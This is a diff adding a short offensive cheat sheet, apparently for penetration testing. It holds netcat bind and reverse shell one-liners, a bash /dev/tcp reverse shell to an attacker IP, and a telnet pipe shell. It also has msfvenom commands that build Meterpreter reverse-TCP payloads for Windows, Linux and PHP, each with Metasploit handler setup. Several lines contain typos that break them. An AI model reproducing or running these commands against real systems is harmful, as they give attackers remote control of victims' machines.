@@ -1,0 +1,55 @@
+----
+ping broadcast 192.168.1.255 to find hosts
+ping all subnets 224.0.0.1 to find other hosts.
+
+--
+
+LINUX nc -lvp 666 -e /bin/bash
+WINDOWS nc -lvp 666 -e cmd.exe
+------------------------------------------------------------
+Attacker side: nc -v $host 666
+Victim side: nc -c /bin/sh $atk_ip 666
+
+------------------------------------------------------------
+COMMAND LINE INJECTION:
+	/bin/bash -i > /dev/tcp/$ATTAKR_IP/666 0<&1 2>&1
+-------------------------------------------------------------
+Telnet Shell:
+	telnet 192.168.1.YOUR_DESTINATION PORT | /bin/bash | telnet 192.168.1.YOUR_DEST
+
+	nc -nlvvp 1Port to exec cmd
+	nc -nlvvp 2Port to see output
+
+--------------------------------------------------------------
+Reverse TCP meterpreter Windows executable payload:
+	msfvenom -p windows/meterpreter/reverse_tcp
+	LHOST=$YOUR_IP $ur_port=666 -f exe > sh.exe
+
+Start Metasploit handler:
+	user exploit/multi/handler
+	set PAYLOAD  windows/meterpreter/reverse_tcp
+	set LHOST $your_Address
+	set LPORT your_port
+	set ExitOnSession false
+	exploit -j -z
+----------------------------------------------------------------
+
+Reverse TCP meterpreter Linux executable payload:
+	msfvenom -p linux/x86/meterpreter/reverse_Tcp
+	LHOST=$YUR_IP lPORT=666 -f elf > sh.elf
+
+
+Start Metasploit Handler:
+	use exploit/multi/handler
+	set PAYLOAD linux/x86/meterpreter/reverse_tcp
+	set LHOST $YOUR_IP
+	set LPORT 666
+	set ExitOnSession false
+	exploit -j -z
+------------------------------------------------------------------
+Reverse TCP meterpreter PHP payload:
+	msfvenom -p php/meterpreter/reverse_tcp
+	LHOST=$YOUR_IP LPORT=666 -f raw > sh.php
+
+Start Metasploit Handler:
+	SAME.
